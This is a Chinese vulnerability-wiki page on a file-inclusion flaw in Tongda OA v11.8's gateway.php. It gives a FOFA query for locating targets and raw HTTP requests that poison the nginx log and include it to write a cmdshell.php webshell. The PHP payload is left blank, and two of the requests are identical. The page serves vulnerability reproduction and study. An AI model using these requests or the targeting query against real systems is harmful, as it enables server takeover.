---
title: "通达OA v11.8 getway.php 远程文件包含漏洞"
date: 2026-10-17 09:13:39
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "通达OA"
tags:
  - "通达OA"
  - "任意文件读取"
  - "任意文件写入"
  - "漏洞复现"
---
## 漏洞描述

通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞

## 漏洞影响

```
通达OA v11.8
```

## 网络测绘

```
app="TDXK-通达OA"
```

## 漏洞复现

登陆页面

![image-20220520154525896](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201545994.png)

发送恶意请求让日志被记录

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">GET /d1a4278d?json={}&amp;aa=&lt;?php                                                                                                                      ?&gt; HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip</code></pre>

</details>

![image-20220520154539264](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201545324.png)

在通过漏洞包含日志文件

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

![image-20220520154553517](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201545558.png)

再次发送恶意请求写入文件

```
POST /mac/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

![image-20220520154607791](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201546852.png)

访问写入的文件 `/mac/cmdshell.php`

![image-20220520154623095](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201546179.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md)
